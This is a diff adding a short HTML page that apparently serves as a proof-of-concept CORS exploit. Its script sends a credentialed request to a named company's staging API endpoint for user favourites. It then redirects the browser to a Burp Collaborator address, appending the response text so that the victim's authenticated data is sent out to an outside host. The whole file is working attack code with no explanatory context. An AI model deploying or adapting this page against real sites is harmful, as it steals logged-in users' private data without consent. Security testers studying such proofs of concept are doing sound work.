@@ -1,0 +1,16 @@
+<html>
+<body>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('GET','https://mory-staging.zeiss.com/emoryservice/api/v1/favourites',true);
+req.withCredentials = true;
+req.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+req.send();
+
+function reqListener() {
+location='https://6kr9nsmcuum6xb1iih2gevc5awgm4b.burpcollaborator.net/log?key='+this.responseText;
+};
+</script>
+</body>
+</html>
